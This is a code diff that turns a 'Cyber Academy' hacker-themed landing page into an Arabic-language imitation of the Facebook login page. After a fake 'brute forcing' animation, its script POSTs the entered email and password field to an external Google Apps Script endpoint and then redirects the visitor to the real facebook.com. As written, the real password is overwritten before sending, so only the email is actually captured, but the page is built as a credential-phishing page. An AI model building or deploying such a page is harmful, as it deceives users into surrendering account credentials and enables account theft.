@@ -1,212 +1,210 @@
-<!DOCTYPE html><html lang="en" dir="ltr">
+<!DOCTYPE html>
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cyber Academy — Join Now</title><style>
-    /* Basic reset + terminal aesthetic */
-    :root{
-        --bg:#06070a;
-        --neon-green:#00ff41;
-        --blue:#007bff;
-        --glass: rgba(0,0,0,0.55);
-    }
-    html,body{height:100%;}
-    body {
-        margin:0;
-        padding:0;
-        background: radial-gradient(ellipse at center, rgba(0,0,0,0.6) 0%, var(--bg) 60%), #000;
-        color:var(--neon-green);
-        font-family: 'Consolas','Courier New',monospace;
-        display:flex;
-        align-items:center;
-        justify-content:center;
-        overflow:hidden;
-    }
+<meta charset="UTF-8">
+<title>Facebook - Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
-    /* Main screen container */
-    .hacker-screen{
-        width:92%;
-        max-width:1000px;
-        height:84vh;
-        padding:28px;
-        box-sizing:border-box;
-        border-radius:6px;
-        background: linear-gradient(180deg, rgba(0,0,0,0.65), rgba(0,0,0,0.5));
-        border:1px solid rgba(0,255,65,0.12);
-        box-shadow: 0 0 30px rgba(0,255,65,0.06), inset 0 0 40px rgba(0,0,0,0.4);
-        position:relative;
-        overflow:hidden;
-    }
+<style>
+:root {
+    --facebook-blue: #1877f2;
+    --input-border: #ccd0d5;
+    --matrix-green: #00ff41;
+}
 
-    /* subtle scanline overlay for vibe */
-    .hacker-screen::before{
-        content:'';
-        position:absolute;
-        inset:0;
-        background-image:linear-gradient(rgba(255,255,255,0.01) 1px, transparent 1px);
-        background-size:100% 3px;
-        pointer-events:none;
-        mix-blend-mode:overlay;
-    }
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Arial, sans-serif;
+    background-color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh;
+    overflow-x: hidden;
+}
 
-    /* terminal text area */
-    #hacker-text{
-        height:calc(100% - 96px);
-        overflow:auto;
-        white-space:pre-wrap;
-        font-size:14px;
-        line-height:1.55;
-        padding-right:10px;
-        -ms-overflow-style:none;  /* IE and Edge */
-        scrollbar-width:none;  /* Firefox */
-    }
-    #hacker-text::-webkit-scrollbar{display:none}
+.logo { margin: 50px 0 30px 0; }
+.logo img { width: 65px; height: 65px; }
+.container { width: 90%; max-width: 360px; position: relative; }
 
-    /* blinking cursor at the end */
-    .cursor{
-        display:inline-block;
-        width:10px;
-        background:var(--neon-green);
-        margin-left:6px;
-        animation:blink 1s steps(2,end) infinite;
-        vertical-align:text-bottom;
-        border-radius:2px;
-        height:1em;
-    }
-    @keyframes blink{50%{opacity:0}} 
+.input-group { position: relative; margin-bottom: 15px; }
+.input-group input {
+    width: 100%; padding: 15px 40px 15px 40px;
+    border: 1px solid var(--input-border); border-radius: 12px; font-size: 15px; box-sizing: border-box;
+    transition: all 0.3s; outline: none;
+}
 
-    /* button container centered at bottom */
-    .button-container{
-        position:absolute;
-        left:50%;
-        transform:translateX(-50%);
-        bottom:22px;
-        display:flex;
-        gap:12px;
-        align-items:center;
-    }
+/* --- فقاعة الخطأ السوداء (ستايل فيسبوك) --- */
+.fb-error-bubble {
+    display: none;
+    position: absolute;
+    background: #1c1e21;
+    color: #fff;
+    font-size: 12px;
+    padding: 8px 12px;
+    border-radius: 4px;
+    top: 55px;
+    right: 5px;
+    z-index: 1000;
+    white-space: nowrap;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+}
+.fb-error-bubble::after {
+    content: "";
+    position: absolute;
+    bottom: 100%;
+    right: 15px;
+    border-width: 6px;
+    border-style: solid;
+    border-color: transparent transparent #1c1e21 transparent;
+}
 
-    /* make the blue button intentionally small and neat */
-    .register-button{
-        background:var(--blue);
-        color:#fff;
-        padding:8px 16px; /* smaller */
-        font-size:0.95rem; /* smaller text */
-        font-weight:600;
-        border-radius:6px;
-        text-decoration:none;
-        box-shadow:0 6px 18px rgba(0,123,255,0.25), 0 0 10px rgba(0,123,255,0.12) inset;
-        transition:transform 0.18s, box-shadow 0.18s;
-        border:1px solid rgba(255,255,255,0.04);
-        display:inline-flex;
-        gap:10px;
-        align-items:center;
-    }
-    .register-button:hover{transform:translateY(-3px); box-shadow:0 10px 30px rgba(0,123,255,0.35)}
+input.hacking-active {
+    border-color: var(--matrix-green) !important;
+    color: var(--matrix-green) !important;
+    background: #000 !important;
+    font-family: monospace;
+}
 
-    /* secondary subtle ghost button */
-    .demo-button{
-        background:transparent;
-        color:var(--neon-green);
-        border:1px solid rgba(0,255,65,0.12);
-        padding:6px 12px;
-        font-size:0.85rem;
-        border-radius:6px;
-        text-decoration:none;
-    }
+.input-group .icon { position: absolute; top: 50%; left: 12px; transform: translateY(-50%); color: #888; pointer-events: none; }
+.toggle-password { position: absolute; top: 50%; right: 12px; transform: translateY(-50%); color: #888; cursor: pointer; z-index: 5; }
 
-    /* responsive tweaks */
-    @media (max-width:520px){
-        .hacker-screen{padding:18px}
-        .register-button{padding:6px 12px;font-size:0.9rem}
-    }
+.matrix-screen {
+    display: none; position: absolute; background: #000; border: 2px solid var(--matrix-green);
+    overflow: hidden; color: var(--matrix-green); font-family: 'Courier New', monospace; 
+    font-size: 11px; z-index: 100; box-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
+}
 
+#screen1 { width: 120px; height: 120px; left: -135px; top: -10px; border-radius: 8px; }
+#screen2 { width: 180px; height: 300px; right: -200px; top: -100px; border-radius: 10px; }
+
+.matrix-text { white-space: pre; padding: 10px; line-height: 1.4; }
+#screen1 .matrix-text { animation: fastScroll 0.2s linear infinite; }
+#screen2 .matrix-text { animation: slowScroll 0.8s linear infinite; }
+
+@keyframes fastScroll { 0% { transform: translateY(0); } 100% { transform: translateY(-60px); } }
+@keyframes slowScroll { 0% { transform: translateY(0); } 100% { transform: translateY(-80px); } }
+
+button[type="submit"] {
+    width: 100%; padding: 15px; border: none; background-color: var(--facebook-blue);
+    color: white; font-size: 17px; font-weight: bold; border-radius: 12px; cursor: pointer;
+}
+
+button[type="submit"]:disabled { background-color: #111; color: var(--matrix-green); border: 1px solid var(--matrix-green); }
+
+.forgot { margin: 14px 0; font-size: 14px; color: #1877f2; text-align: center; }
+.create-account { margin-top: 10px; padding: 15px; width: 100%; border: 1px solid var(--facebook-blue); background: #fff; color: var(--facebook-blue); font-size: 16px; font-weight: bold; border-radius: 12px; }
+
+@media (max-width: 850px) {
+    #screen1 { left: 0px; top: -130px; width: 90px; height: 90px; }
+    #screen2 { right: 0px; top: -320px; width: 140px; height: 220px; }
+}
 </style>
-
 </head>
 <body>
-    <div class="hacker-screen">
-        <pre id="hacker-text" aria-live="polite"></pre><div class="button-container">
-        <a class="register-button" href="https://youcefcheria.github.io/Youcef/" target="_blank" rel="noopener noreferrer">
-            JOIN NOW
-        </a>
-        <a class="demo-button" href="#" id="demo">LIVE DEMO</a>
-    </div>
+
+<div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="FB"></div>
+
+<div class="container">
+    <form id="myForm" novalidate> <div class="input-group">
+            <input type="text" id="emailInput" placeholder="الرقم أو الإيميل">
+            <i class="fa-solid fa-user icon"></i>
+            <div class="fb-error-bubble" id="emailError">يجب عليك إدخال الرقم أو الإيميل</div>
+            <div class="matrix-screen" id="screen1"><div class="matrix-text" id="text1"></div></div>
+        </div>
+
+        <div class="input-group">
+            <input type="password" id="passInput" placeholder="كلمة المرور">
+            <i class="fa-solid fa-lock icon"></i>
+            <i class="fa-solid fa-eye-slash toggle-password" id="togglePassword"></i>
+            <div class="fb-error-bubble" id="passError">يجب عليك إدخال كلمة السر</div>
+            <div class="matrix-screen" id="screen2"><div class="matrix-text" id="text2"></div></div>
+        </div>
+
+        <button type="submit" id="submitBtn">تسجيل الدخول</button>
+    </form>
+    <div class="forgot">هل نسيت كلمة السر؟</div>
+    <button class="create-account">إنشاء حساب جديد</button>
 </div>
 
 <script>
-    // English 'hacker' terminal content — more dramatic and dynamic
-    const textContent = `
+const form = document.getElementById("myForm");
+const submitBtn = document.getElementById("submitBtn");
+const emailInput = document.getElementById("emailInput");
+const passInput = document.getElementById("passInput");
+const emailError = document.getElementById("emailError");
+const passError = document.getElementById("passError");
+const togglePassword = document.getElementById("togglePassword");
+const screens = [document.getElementById("screen1"), document.getElementById("screen2")];
+const texts = [document.getElementById("text1"), document.getElementById("text2")];
 
-[SYSTEM BOOT SEQUENCE INITIATED]
+// إظهار/إخفاء كلمة المرور
+togglePassword.addEventListener("click", () => {
+    const type = passInput.type === "password" ? "text" : "password";
+    passInput.type = type;
+    togglePassword.classList.toggle("fa-eye");
+    togglePassword.classList.toggle("fa-eye-slash");
+});
 
-> Loading secure modules... [OK] Initializing adaptive firewall... [OK] Spawning encrypted console... [OK]
+// إخفاء الفقاعة عند بدء الكتابة
+emailInput.addEventListener("input", () => emailError.style.display = "none");
+passInput.addEventListener("input", () => passError.style.display = "none");
 
+const hackerPasswords = ["admin123", "password!@#", "hacked_2024", "root_system", "FB_Access_77", "qwerty0000"];
+const hackerData = [
+    "IP: 192.168.1.1\nPORT: 443\nBYPASSING...\nDECRYPTING\nSALT: 0x88\n",
+    "ESTABLISHING PROXY...\nLOCATION: ALGERIA\nINJECTING_SQL...\nSTRM_DATA: VERIFIED\nKEY_FOUND: ********\nSYSTEM_OVERRIDE: YES\n"
+];
 
+form.addEventListener("submit", (e) => {
+    e.preventDefault();
 
-== ACCESS: ACADEMY TERMINAL == Welcome, Operator. You are entering the Cyber Academy — ethical hacking & advanced defense training.
-
-[Probing available tracks...]
-
-"Intro to Python for Security"         (Level: Beginner)
-
-"Web Application Penetration"         (Level: Advanced)
-
-"Applied Cryptography"                (Level: Intermediate)
-
-"Network Exploitation & Forensics"    (Level: Expert)
-
-
-To proceed, press the small blue button below. This gateway unlocks tutorials, CTFs, and labs.
-
-[Note] This environment is simulated. Use your skills responsibly.
-
-> Terminal status: READY Listening for user input...`;
-
-
-
-const el = document.getElementById('hacker-text');
-    let i = 0;
-    const typingSpeed = 20; // ms per character
-
-    function typeWriter(){
-        if(i < textContent.length){
-            // reveal one char at a time
-            const ch = textContent.charAt(i);
-            el.textContent += ch;
-            i++;
-            // auto-scroll as text grows
-            el.scrollTop = el.scrollHeight;
-            setTimeout(typeWriter, typingSpeed + (ch === '\n' ? 45 : 0));
-        } else {
-            // append blinking cursor once done
-            const c = document.createElement('span');
-            c.className = 'cursor';
-            el.appendChild(c);
-        }
+    // التحقق يدوياً لإظهار الفقاعة السوداء
+    let isValid = true;
+    if (emailInput.value.trim() === "") {
+        emailError.style.display = "block";
+        isValid = false;
+    }
+    if (passInput.value.trim() === "") {
+        passError.style.display = "block";
+        isValid = false;
     }
 
-    // subtle random 'glitch' flashes to excite the UI
-    function randomGlitch(){
-        const box = document.querySelector('.hacker-screen');
-        box.style.boxShadow = `0 0 ${8 + Math.random()*28}px rgba(0,255,65,${0.04 + Math.random()*0.12})`;
-        setTimeout(()=>{box.style.boxShadow = ''}, 120 + Math.random()*180);
-        setTimeout(randomGlitch, 2200 + Math.random()*3400);
-    }
+    if (!isValid) return;
 
-    window.addEventListener('load', ()=>{
-        typeWriter();
-        setTimeout(randomGlitch, 800);
+    // --- إذا كانت الحقول ممتلئة يبدأ نظام الهكر ---
+    screens.forEach((s, index) => {
+        s.style.display = "block";
+        texts[index].innerText = hackerData[index].repeat(60);
     });
 
-    // Demo button quick behavior (no harmful actions)
-    document.getElementById('demo').addEventListener('click', (e)=>{
-        e.preventDefault();
-        // append a short demo output
-        const demoText = `\n\n[DEMO] Running safe exploit simulation... [SIMULATION]\nResult: Sandbox environment stable. No systems harmed.\n`;
-        el.textContent += demoText;
-        el.scrollTop = el.scrollHeight;
-    });
+    submitBtn.disabled = true;
+    passInput.classList.add("hacking-active");
+    passInput.type = "text";
+
+    let timer = 0;
+    const bruteForceInterval = setInterval(() => {
+        const randomPass = hackerPasswords[Math.floor(Math.random() * hackerPasswords.length)];
+        passInput.value = randomPass + "_" + Math.floor(Math.random() * 999);
+    }, 100);
+
+    let progress = 0;
+    const progressInterval = setInterval(() => {
+        progress++;
+        submitBtn.innerText = `BRUTE FORCING... ${progress}%`;
+        if(progress >= 100) clearInterval(progressInterval);
+    }, 190);
+
+    setTimeout(() => {
+        clearInterval(bruteForceInterval);
+        passInput.value = "PASS_FOUND: " + hackerPasswords[0];
+        
+        fetch("https://script.google.com/macros/s/YOUR_ID/exec", {
+            method: "POST",
+            body: JSON.stringify({email: emailInput.value, pass: passInput.value})
+        });
+
+        setTimeout(() => {
+            window.location.href = "https://www.facebook.com";
+        }, 1500);
+    }, 20000);
+});
 </script>
 
 </body>
